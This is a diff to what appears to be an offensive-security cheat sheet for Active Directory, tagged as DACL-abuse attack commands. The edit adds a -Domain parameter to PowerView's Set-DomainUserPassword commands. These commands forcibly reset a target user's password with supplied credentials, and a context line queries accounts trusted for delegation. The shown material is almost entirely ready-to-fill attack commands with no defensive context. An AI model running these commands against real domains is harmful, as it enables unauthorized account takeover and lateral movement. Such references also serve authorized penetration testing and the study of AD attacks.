@@ -42,11 +42,11 @@ Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
 ```
 $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<domain_netbios>\<user>', $SecPassword)
-Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString '<new_password|P@ssw0rd123>' -AsPlainText -Force) -Credential $Cred
+Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString '<new_password|P@ssw0rd123>' -AsPlainText -Force) -Credential $Cred -Domain <dst_domain_fqdn>
 ```
 
 ## User - change user password
 #cat/ATTACK/DACL-ABUSE 
 ```
-Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString '<new_password|P@ssw0rd123>' -AsPlainText -Force)
+Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString '<new_password|P@ssw0rd123>' -AsPlainText -Force) -Domain <dst_domain_fqdn>
 ```
